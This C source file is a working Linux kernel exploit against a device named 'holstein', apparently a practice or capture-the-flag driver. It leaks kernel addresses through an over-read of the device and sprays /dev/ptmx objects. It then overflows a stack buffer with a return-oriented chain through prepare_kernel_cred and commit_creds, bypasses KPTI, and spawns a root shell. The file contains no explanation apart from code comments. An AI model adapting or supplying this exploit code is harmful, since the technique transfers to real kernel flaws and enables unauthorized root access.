#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>

unsigned long kbase;

unsigned long pop_rdi_ret = 0x27bbdc; // 0xffffffff8127bbdc
unsigned long rop_iretq = 0x0202af; // 0xffffffff810202af found using: objdump -d vmlinux | grep iretq
unsigned long pop_rcx_ret = 0x2ea083; // 0xffffffff812ea083
unsigned long pop_rdx_rcx_rbx_rbp_ret = 0x2e31f7;
unsigned long swapgs_ret = 0x60bf7e; //0xffffffff8160bf7e // Used for context switching between kernel mode and user mode
unsigned long mov_rdi_rax_rep = 0x60c96b; // 0xffffffff8160c96b // mov rdi, rax and then mov qword [rdi], [rsi] rcx times. (put 0 in rcx to cancel ;-))
unsigned long find_task_by_vpid = 0x68d40; // 0xffffffff81068d40
unsigned long prepare_kernel_cred = 0x6e240; //0xffffffff8106e240
unsigned long commit_creds = 0x06e390; // 0xffffffff8106e390
unsigned long rop_kpti_trampoline = 0x800e26; // 0xffffffff81800e26

int global_fd;

void fatal(const char *msg) {
  perror(msg);
  exit(1);
}

void open_dev(char *name){
  char devname[100] = "/dev/";
  strcat(devname, name);
  global_fd = open(devname, O_RDWR);
	if (global_fd < 0){
		puts("[!] Failed to open device");
		exit(-1);
	} else {
    puts("[*] Opened device");
    }
}

unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state");
}

void get_shell(void){
    puts("[*] Returned to userland");
    if (getuid() == 0){
        printf("[*] UID: %d, got root!\n", getuid());
        system("/bin/sh");
    } else {
        printf("[!] UID: %d, didn't get root\n", getuid());
        exit(-1);
    }
}

unsigned long shell_addr = (unsigned long)get_shell;

void my_jump(void) { // needed because of stack alignment
    __asm__(
        ".intel_syntax noprefix;"
        "mov rax, shell_addr;"
        "push rax;"
        "ret;"
        ".att_syntax;"
    );
}

unsigned long user_rip = (unsigned long)my_jump;

void leak(){
    char buf[0x500];
    memset(buf, 'A', 0x480);

    read(global_fd, buf, 0x410);
    unsigned long leak_vfs_read = *(unsigned long*)&buf[0x408];
    printf("vfs_read: 0x%lx\n", leak_vfs_read);

    // Found the addr 0xffffffff8113d33c by looking though vfs_read.
    // It is the return addr of a call to a helper function inside vfs_read. The call is the 47th instruction when using
    // x/50i 0xffffffff8113d290 where 0xffffffff8113d290 is the address of vfs_read.
    // All this means is that 0xffffffff8113d33c is our leaked addr and we need to subtract the offset 0x13d33c from our leak
    // to get the kernel base addr.
    unsigned long vfs_offset = 0x13d33c; 
    printf("vfs offset: 0x%lx\n", vfs_offset);
    kbase = leak_vfs_read - vfs_offset; // calculate kernel base = leak - offset
    printf("Kernel base: 0x%lx\n", kbase);
    unsigned long kbase1 = leak_vfs_read - (0xffffffff8113d33c - 0xffffffff81000000);
    printf("Test: 0x%lx\n", kbase1);
    pop_rdi_ret = pop_rdi_ret + kbase;
    rop_iretq += kbase; // 0xffffffff810202af found using: objdump -d vmlinux | grep iretq
    pop_rcx_ret += kbase; // 0xffffffff812ea083
    swapgs_ret += kbase; //0xffffffff8160bf7e // Used for context switching between kernel mode and user mode
    mov_rdi_rax_rep += kbase; // 0xffffffff8160c96b // mov rdi, rax and then mov qword [rdi], [rsi] rcx times. (put 0 in rcx to cancel ;-))
    find_task_by_vpid += kbase; // 0xffffffff81068d40
    prepare_kernel_cred += kbase; //0xffffffff8106e240
    commit_creds += kbase; // 0xffffffff8106e390
    rop_kpti_trampoline += kbase; // 0xffffffff81800e26

    printf("Gekko\n");
    printf("Commit creds: 0x%lx\n", commit_creds);
}

void leak2() {

    char buf[0x2000];
    puts("memset");
    memset(buf, 'A', 0x2000);

    puts("read");
    read(global_fd, buf, 0x2000);
    puts("read done");
    for (int i = 0; i < 200; i++) {
        printf("i: %d val: 0x%lx ",i, 0x8*i);
        unsigned long leak = *(unsigned long*)&buf[0x8*i];
        printf("leak: 0x%lx\n", leak);
    }

    unsigned long leak = *(unsigned long*)&buf[0x18];
    printf("ptm_opt: 0x%lx\n", leak);

    // Found the addr 0xffffffff8113d33c by looking though vfs_read.
    // It is the return addr of a call to a helper function inside vfs_read. The call is the 47th instruction when using
    // x/50i 0xffffffff8113d290 where 0xffffffff8113d290 is the address of vfs_read.
    // All this means is that 0xffffffff8113d33c is our leaked addr and we need to subtract the offset 0x13d33c from our leak
    // to get the kernel base addr.
    unsigned long ptm_opt_offset = 0xc39ae0; 
    printf("ptm_opt offset: 0x%lx\n", ptm_opt_offset);
    kbase = leak - ptm_opt_offset; // calculate kernel base = leak - offset
    printf("Kernel base: 0x%lx\n", kbase);
    pop_rdi_ret = pop_rdi_ret + kbase;
    printf("pop rdi ret: 0x%lx\n", pop_rdi_ret);
    rop_iretq += kbase; // 0xffffffff810202af found using: objdump -d vmlinux | grep iretq
    printf("pop_iretq: 0x%lx\n", rop_iretq);
    pop_rcx_ret += kbase; // 0xffffffff812ea083
    printf("pop_rcx_ret: 0x%lx\n", pop_rcx_ret);
    swapgs_ret += kbase; //0xffffffff8160bf7e // Used for context switching between kernel mode and user mode
    printf("swapgd_ret: 0x%lx\n", swapgs_ret);
    mov_rdi_rax_rep += kbase; // 0xffffffff8160c96b // mov rdi, rax and then mov qword [rdi], [rsi] rcx times. (put 0 in rcx to cancel ;-))
    printf("mov_rdi_rax_rep: 0x%lx\n", mov_rdi_rax_rep);

    find_task_by_vpid += kbase; // 0xffffffff81068d40
    printf("find_task_by_vpid: 0x%lx\n", find_task_by_vpid);
    prepare_kernel_cred += kbase; //0xffffffff8106e240
    printf("prepare kernel cred: 0x%lx\n", prepare_kernel_cred);
    commit_creds += kbase; // 0xffffffff8106e390
    printf("Commit creds: 0x%lx\n", commit_creds);
    rop_kpti_trampoline += kbase; // 0xffffffff81800e26
    printf("rop_kpti_trampoline: 0x%lx\n", rop_kpti_trampoline);
    pop_rdx_rcx_rbx_rbp_ret += kbase;
    printf("pop_mega: 0x%lx\n",pop_rdx_rcx_rbx_rbp_ret);
}


void overflow() {
    char buf[0x500];
    memset(buf, 'A', 0x408);
    unsigned long *chain = (unsigned long)&buf[0x408];
    *chain++ = pop_rdi_ret; 
    *chain++ = 0x1; // pid of init, running with root privileges
    *chain++ = find_task_by_vpid;
    *chain++ = pop_rdx_rcx_rbx_rbp_ret;
    *chain++ = 0x0; // 0 out the counter in the next gadget
    *chain++ = 0x0; // 0 out the counter in the next gadget
    *chain++ = 0x0; // 0 out the counter in the next gadget
    *chain++ = 0x0; // 0 out the counter in the next gadget
    *chain++ = mov_rdi_rax_rep; // put result of find_task_by_vpid into rdi
    *chain++ = prepare_kernel_cred; // return to prepare_kernel_cred
    *chain++ = pop_rdx_rcx_rbx_rbp_ret;
    *chain++ = 0x0; // 0 out the counter in the next gadget
    *chain++ = 0x0; // 0 out the counter in the next gadget
    *chain++ = 0x0; // 0 out the counter in the next gadget
    *chain++ = 0x0; // 0 out the counter in the next gadget
    *chain++ = mov_rdi_rax_rep; // put result of prepare_kernel_cred into rdi
    *chain++ = commit_creds; // return to commit_creds
    *chain++ = rop_kpti_trampoline; 
    *chain++ = 0xdeadbeef; // rax
    *chain++ = 0xdeadbeef; // rdi
    *chain++ = (unsigned long)&my_jump; // rip. Use myjump function to align stack before calling system
    *chain++ = user_cs; // cs
    *chain++ = user_rflags; // rpflags
    *chain++ = user_sp; // rsp
    *chain++ = user_ss; // ss

    write(global_fd, buf, (void*)chain - (void*)buf); // since chain has been incremeneted
}

void spray() {
    int spray[100];
    for (int i = 0; i < 100; i++) {
        spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    }

    for (int i = 0; i < 100; i++) {
        close(spray[i]);
    }

}


int main() {

    printf("Spray\n");
    spray();
    save_state();

    open_dev("holstein");
    printf("leak2\n");
    leak2();

    //leak();


    overflow();

    close(global_fd);
    puts("[!] end of main");

    return 0;
  }